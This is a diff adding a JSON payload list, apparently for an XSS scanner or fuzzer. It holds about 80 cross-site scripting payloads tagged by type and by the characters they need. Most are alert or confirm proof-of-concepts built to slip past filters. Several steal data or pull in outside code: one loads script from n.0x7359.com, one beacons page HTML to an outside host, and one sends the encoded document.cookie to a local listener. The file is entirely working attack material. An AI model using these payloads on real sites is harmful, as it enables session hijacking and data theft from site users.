@@ -1,0 +1,1176 @@
+[
+  {
+    "Payload": "\"><img src=x onafterprint=prompt(document.domain);>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 51
+  },
+  {
+    "Payload": "\"><form onformdata=window.confirm(document.cookie)><!--",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 55
+  },
+  {
+    "Payload": "';document.addEventListener('DOMContentLoaded', function(){var c = function(){a();};var s = document.createElement('script');s.src = 'https://n.0x7359.com/xss.js';s.onreadystatechange = c;document.body.appendChild(s);});//",
+    "Attribute": [
+      ")",
+      "'",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "reflection",
+    "encoding": "none",
+    "length": 222
+  },
+  {
+    "Payload": "';alert(document.cookie)//",
+    "Attribute": [
+      ")",
+      "'",
+      ";",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 26
+  },
+  {
+    "Payload": "<script>var a=document.createElement(\"a\");a.href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\";http://a.click();</script>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 136
+  },
+  {
+    "Payload": "<scr<script>ipt>document.write(\"Successful XSS\")</scr<script>ipt>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 65
+  },
+  {
+    "Payload": "/?xss=500); alert(document.cookie);//",
+    "Attribute": [
+      ")",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 37
+  },
+  {
+    "Payload": "\"><script akdk> prompt(document.domain)</script akdk>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 53
+  },
+  {
+    "Payload": "<details/open=/Open/href=/data=;+ontoggle=\"(alert)(document.domain)",
+    "Attribute": [
+      "\"",
+      ")",
+      "<",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "reflection",
+    "encoding": "none",
+    "length": 67
+  },
+  {
+    "Payload": "<object/data=\"javascript&colon;alert/**/(document.domain)\">//",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      ";",
+      "/",
+      "(",
+      "&",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 61
+  },
+  {
+    "Payload": "<script>prompt(document.domain)</script>",
+    "Attribute": [
+      ">",
+      ")",
+      "<",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 40
+  },
+  {
+    "Payload": "[[constructor.constructor('alert(document.cookie)')()]]",
+    "Attribute": [
+      "(",
+      ")",
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 55
+  },
+  {
+    "Payload": "</script><script>confirm(document.cookie)</script>",
+    "Attribute": [
+      ">",
+      ")",
+      "<",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 50
+  },
+  {
+    "Payload": "'>&lt;/b&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;b&gt;&lt;!--",
+    "Attribute": [
+      ">",
+      ")",
+      "'",
+      ";",
+      "/",
+      "(",
+      "&"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 79
+  },
+  {
+    "Payload": "(function(){alert(document.cookie)})();",
+    "Attribute": [
+      ";",
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 39
+  },
+  {
+    "Payload": "\"alert(document.cookie)['script'](2);\"",
+    "Attribute": [
+      "\"",
+      ")",
+      "'",
+      ";",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 38
+  },
+  {
+    "Payload": "'});alert(document.cookie);//'",
+    "Attribute": [
+      ")",
+      "'",
+      ";",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 30
+  },
+  {
+    "Payload": "'><scr'+'ipt>alert(document.cookie)</scr'+'ipt><b><!--",
+    "Attribute": [
+      ">",
+      ")",
+      "'",
+      "<",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 54
+  },
+  {
+    "Payload": "');alert(document.cookie)();//",
+    "Attribute": [
+      ")",
+      "'",
+      ";",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 30
+  },
+  {
+    "Payload": "\"><img src=x id=\"img\"> <script>document.getElementById('img').addEventListener('error', function(){prompt(document.domain);})</script>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 134
+  },
+  {
+    "Payload": "\"><img src=x id=img> <script>document.getElementById('img').addEventListener('error',function(){prompt(document.domain);})</script>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 131
+  },
+  {
+    "Payload": "/><script>window.alert('XSS Vulnerable');</script>",
+    "Attribute": [
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 50
+  },
+  {
+    "Payload": "\"><body/oNpagEshoW=(confirm)(document.domain)>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "reflection",
+    "encoding": "none",
+    "length": 46
+  },
+  {
+    "Payload": "\"><u>XSS</u><marquee+onstart='alert(document.cookie)'>XSS",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 57
+  },
+  {
+    "Payload": "xss\"</sc\"ript><sv\"g/onloa\"d=aler\"t\"(document.doma\"in)>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "reflection",
+    "encoding": "none",
+    "length": 54
+  },
+  {
+    "Payload": "'confirm(document.domain)'>",
+    "Attribute": [
+      ">",
+      "(",
+      ")",
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 27
+  },
+  {
+    "Payload": "<scr<script>ipt>prompt(document.cookie)</scr</script>ipt>",
+    "Attribute": [
+      ">",
+      ")",
+      "<",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 57
+  },
+  {
+    "Payload": "\";location=location.hash)//#0={};alert(0)",
+    "Attribute": [
+      "\"",
+      ")",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 41
+  },
+  {
+    "Payload": "Set.constructor`alert\\x28document.domain\\x29",
+    "Attribute": [],
+    "count": 0,
+    "waf": null,
+    "type": "reflection",
+    "encoding": "none",
+    "length": 44
+  },
+  {
+    "Payload": "<script>new Function`X${document.location.hash.substr`1`}`</script>",
+    "Attribute": [
+      "/",
+      ">",
+      "<"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 67
+  },
+  {
+    "Payload": "<script>Function`X${document.location.hash.substr`1`}```</script>",
+    "Attribute": [
+      "/",
+      ">",
+      "<"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 65
+  },
+  {
+    "Payload": "<body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",
+    "Attribute": [
+      ">",
+      ")",
+      "'",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "reflection",
+    "encoding": "none",
+    "length": 105
+  },
+  {
+    "Payload": "-(confirm)(document.domain)//",
+    "Attribute": [
+      "/",
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "reflection",
+    "encoding": "none",
+    "length": 29
+  },
+  {
+    "Payload": "[a](j a v a s c r i p t:prompt(document.cookie))",
+    "Attribute": [
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 48
+  },
+  {
+    "Payload": "player.swf?playerready=alert(document.cookie)",
+    "Attribute": [
+      "(",
+      ")",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 45
+  },
+  {
+    "Payload": "player.swf?tracecall=alert(document.cookie)",
+    "Attribute": [
+      "(",
+      ")",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 43
+  },
+  {
+    "Payload": "document.write(atob('PGltZyBzcmM9aHR0cDovL2xvY2FsaG9zdDo4MDkvcD89') + btoa(document.cookie) + '>')",
+    "Attribute": [
+      ">",
+      "(",
+      ")",
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "reflection",
+    "encoding": "none",
+    "length": 98
+  },
+  {
+    "Payload": "window[document.body.innerText.charAt(document.body.innerText.indexOf('a'))+'lert'](1)",
+    "Attribute": [
+      "(",
+      ")",
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "reflection",
+    "encoding": "none",
+    "length": 86
+  },
+  {
+    "Payload": "<details+/'on+/ontoggle=1^confirm(document.domain)+open//",
+    "Attribute": [
+      ")",
+      "'",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 57
+  },
+  {
+    "Payload": "<a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;\">X</a>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      ";",
+      "/",
+      "(",
+      "&",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "reflection",
+    "encoding": "none",
+    "length": 121
+  },
+  {
+    "Payload": "'-[document.domain].map(alert)-'",
+    "Attribute": [
+      "(",
+      ")",
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "reflection",
+    "encoding": "none",
+    "length": 32
+  },
+  {
+    "Payload": "\"]);}catch(e){}if(!self.a)self.a=!alert(document.domain);//",
+    "Attribute": [
+      "\"",
+      ")",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 59
+  },
+  {
+    "Payload": "'-confirm(document.cookie)-'",
+    "Attribute": [
+      "(",
+      ")",
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 28
+  },
+  {
+    "Payload": "<--'<Script>Window.Confirm(2)</Script> --!>",
+    "Attribute": [
+      ">",
+      ")",
+      "'",
+      "<",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 43
+  },
+  {
+    "Payload": "{alert('document.cookie')}",
+    "Attribute": [
+      "(",
+      ")",
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 26
+  },
+  {
+    "Payload": "'-confirm(document.domain)-'",
+    "Attribute": [
+      "(",
+      ")",
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 28
+  },
+  {
+    "Payload": "document.body.innerHTML=document.body.innerText",
+    "Attribute": [
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "reflection",
+    "encoding": "none",
+    "length": 47
+  },
+  {
+    "Payload": "+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-",
+    "Attribute": [
+      "/",
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 57
+  },
+  {
+    "Payload": "window.name=\"alert(23)\";",
+    "Attribute": [
+      "\"",
+      ")",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 24
+  },
+  {
+    "Payload": "<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=\"prompt(document.cookie);\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 95
+  },
+  {
+    "Payload": "\"><div class=progress><div onwebkitanimationstart=prompt(document.domain)>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 74
+  },
+  {
+    "Payload": "/on<script>load=prompt(document.cookie);>",
+    "Attribute": [
+      ">",
+      ")",
+      "<",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 41
+  },
+  {
+    "Payload": "alert(document.domain)",
+    "Attribute": [
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 22
+  },
+  {
+    "Payload": "console.log(document.domain)",
+    "Attribute": [
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 28
+  },
+  {
+    "Payload": "<a href=”javas cript:alert(document.cookie)” >Testing.com </a>",
+    "Attribute": [
+      ">",
+      ")",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 62
+  },
+  {
+    "Payload": "http://www.google<script .com>alert(document.location)</script",
+    "Attribute": [
+      ">",
+      ")",
+      "<",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 62
+  },
+  {
+    "Payload": "';alert(document.domain)//",
+    "Attribute": [
+      ")",
+      "'",
+      ";",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 26
+  },
+  {
+    "Payload": "window.location.assign(\"http://xss.cx\")",
+    "Attribute": [
+      "\"",
+      "/",
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "reflection",
+    "encoding": "none",
+    "length": 39
+  },
+  {
+    "Payload": "window.name='a\\x01b'",
+    "Attribute": [
+      "=",
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "reflection",
+    "encoding": "none",
+    "length": 20
+  },
+  {
+    "Payload": "window.name='hacked';location.replace('about:blank');",
+    "Attribute": [
+      ")",
+      "'",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "reflection",
+    "encoding": "none",
+    "length": 53
+  },
+  {
+    "Payload": "window.open(\"http://xss.cx\",\"confirm(document.domain);\", \"\", false);",
+    "Attribute": [
+      "\"",
+      ")",
+      ";",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 68
+  },
+  {
+    "Payload": "\\\";confirm(document.location);//",
+    "Attribute": [
+      "\"",
+      ")",
+      ";",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 32
+  },
+  {
+    "Payload": "confirm(document.location)",
+    "Attribute": [
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 26
+  },
+  {
+    "Payload": "confirm(document.selection.createRange().getBookmark())",
+    "Attribute": [
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 55
+  },
+  {
+    "Payload": "confirm(location.hostname)",
+    "Attribute": [
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 26
+  },
+  {
+    "Payload": "confirm(window.toStaticHTML('<base href=\"http://xss.cx/\"></base>'));",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 68
+  },
+  {
+    "Payload": "confirm(window.toStaticHTML('<label style=\"overflow:hidden;background:red;display:block;width:4000px;height:4000px;position:absolute;top:0px;left:0px;\" for=\"submit\">Click'));",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 174
+  },
+  {
+    "Payload": "confirm(window.toStaticHTML('<marquee>foo</marquee>'));",
+    "Attribute": [
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 55
+  },
+  {
+    "Payload": ";\\\"))}catch(e) {confirm(document.location);}//",
+    "Attribute": [
+      "\"",
+      ")",
+      ";",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 46
+  },
+  {
+    "Payload": ";\\\\\"))}catch(e) {confirm(document.location);}//",
+    "Attribute": [
+      "\"",
+      ")",
+      ";",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 47
+  },
+  {
+    "Payload": "\\\"));}catch(e){confirm(document.domain);}//",
+    "Attribute": [
+      "\"",
+      ")",
+      ";",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 43
+  },
+  {
+    "Payload": "\\\"));}catch(e){confirm(document.domain)}//",
+    "Attribute": [
+      "\"",
+      ")",
+      ";",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 42
+  },
+  {
+    "Payload": "\\\"));}catch(e){x=window.open('http://xss.cx/');setTimeout('confirm(x.document.body.innerText)',4000)}//",
+    "Attribute": [
+      "\"",
+      ")",
+      "'",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 103
+  },
+  {
+    "Payload": "\";document.body.addEventListener(\"DOMActivate\",confirm(1))//",
+    "Attribute": [
+      "\"",
+      ")",
+      ";",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 60
+  },
+  {
+    "Payload": "prompt(location.hash)",
+    "Attribute": [
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 21
+  },
+  {
+    "Payload": "prototype.join=function(){confirm(\"PWND:\"+document.body.innerHTML)}')();",
+    "Attribute": [
+      "\"",
+      ")",
+      "'",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 72
+  },
+  {
+    "Payload": "<strong><button popovertarget=\"x\">click me</button><test onbeforetoggle=\"alert(document.domain)\" popover id=\"x\">aaa</test></strong>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 131
+  },
+  {
+    "Payload": "<strong><button popovertarget=\"x\"></button><test onbeforetoggle=\"alert(document.domain)\" popover id=\"x\"></test></strong>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "function_based",
+    "encoding": "none",
+    "length": 120
+  }
+]
